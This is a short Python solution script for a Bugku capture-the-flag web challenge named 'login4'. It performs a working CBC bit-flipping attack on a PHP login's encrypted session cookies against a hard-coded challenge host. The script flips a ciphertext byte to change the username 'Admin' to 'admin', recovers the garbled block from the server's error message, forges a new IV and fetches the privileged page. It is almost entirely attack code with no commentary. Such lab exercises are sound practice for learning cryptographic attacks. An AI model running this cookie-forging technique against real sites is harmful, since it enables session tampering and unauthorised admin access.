"""
https://ctf.bugku.com/challenges#login4
"""
import re
import base64
import phpserialize
import urllib.parse
import requests


def decode(s):
    return base64.b64decode(urllib.parse.unquote(s).encode())


def encode(b):
    return urllib.parse.quote(base64.b64encode(b).decode())


url = "http://123.206.31.85:49168/index.php"

session = requests.Session()

data = {"username": "Admin", "password": "123456"}

r1 = session.post(url, data)
iv = r1.cookies["iv"]
cipher = r1.cookies["cipher"]
cipher_data = data


iv = decode(iv)
print("iv:", iv)

cipher = decode(cipher)
print("cipher:", cipher)

plaintext = phpserialize.serialize(cipher_data)
plaintext_grouped = [plaintext[i:i + 16] for i in range(0, len(plaintext), 16)]
print("plaintext_grouped:", plaintext_grouped)


offset = 9
print("offset:", offset)

new_cipher = cipher[:offset] + bytes([cipher[offset] ^ ord("A") ^ ord("a")]) + cipher[offset + 1:]
print("new_cipher", new_cipher)


session.cookies["cipher"] = encode(new_cipher)
r2 = session.get(url)
plaintext_decode_error = re.search(r"base64_decode\('(.*?)'\)", r2.text).group(1)
plaintext_decode_error = decode(plaintext_decode_error)

error_g1_plaintext = plaintext_decode_error[:16]
g1_plaintext = plaintext_grouped[0]
new_iv = bytes([iv[i] ^ error_g1_plaintext[i] ^ g1_plaintext[i] for i in range(16)])

# _iv = list(iv)
# _iv[offset] = _iv[offset] ^ plaintext_grouped[1][offset] ^ ord("a")
# new_iv = bytes(_iv)

session.cookies["iv"] = encode(new_iv)
r3 = session.get(url)
print(r3.text)
